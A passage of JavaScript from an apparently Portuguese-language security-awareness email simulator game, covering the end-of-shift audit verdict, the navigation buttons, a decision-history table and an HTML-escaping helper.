      this.auditVerdictText.textContent = `Você teve ${incorrectCount} incidente(s), mas manteve a infraestrutura sob controle e está plenamente autorizado a prosseguir!`;
    } else {
      this.auditVerdictTitle.textContent = `Parecer do CISO & CEO Rogério: Reprovado no Turno ${shift.shiftNumber} (Mais de ${maxAllowedErrors} Erro(s))`;
      this.auditVerdictText.textContent = `Você cometeu ${incorrectCount} erros críticos, ultrapassando o limite tolerado de ${maxAllowedErrors} falha(s). A integridade da empresa foi comprometida.`;
    }

    if (!isFinalShift) {
      const nextShiftNum = shift.shiftNumber + 1;
      this.btnNextShiftAction.style.display = 'inline-flex';
      this.btnNextShiftAction.textContent = isApproved 
        ? `▶ Avançar para o Turno ${nextShiftNum} (${CAMPAIGN_SHIFTS[this.currentShiftIndex + 1].brandName})` 
        : `🔄 Repetir Turno ${shift.shiftNumber}`;
      this.btnRestartShift.style.display = 'none';
    } else {
      this.btnNextShiftAction.style.display = 'none';
      this.btnRestartShift.style.display = 'inline-flex';
      this.btnRestartShift.textContent = '🔄 Reiniciar Campanha Completa (Do Turno 1)';
    }

    this.auditTableBody.innerHTML = this.decisionsHistory.map((item, idx) => `
      <tr>
        <td><strong>#${idx + 1}</strong></td>
        <td><span class="row-tag tag-${item.channel}">${item.channel.toUpperCase()}</span></td>
        <td><strong>${this.escapeHtml(item.subject)}</strong></td>
        <td>${this.escapeHtml(item.chosenActionLabel)}</td>
        <td><strong style="color: ${item.correct ? 'var(--google-green)' : 'var(--google-red)'};">${item.correct ? '✅ ACERTO' : '❌ INCIDENTE'}</strong></td>
        <td style="font-size: 11.5px; color: #444746; line-height: 1.4;">
          <strong>${this.escapeHtml(item.logTitle)}:</strong> ${this.escapeHtml(item.consequence)}<br>
          <em style="color: #747775;">${this.escapeHtml(item.explanation)}</em>
        </td>
      </tr>
    `).join('');
  }

  escapeHtml(str) {
    if (!str) return '';
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }
}

// Start Simulator
window.addEventListener('DOMContentLoaded', () => {
  window.simulator = new TechMailSimulator();
});
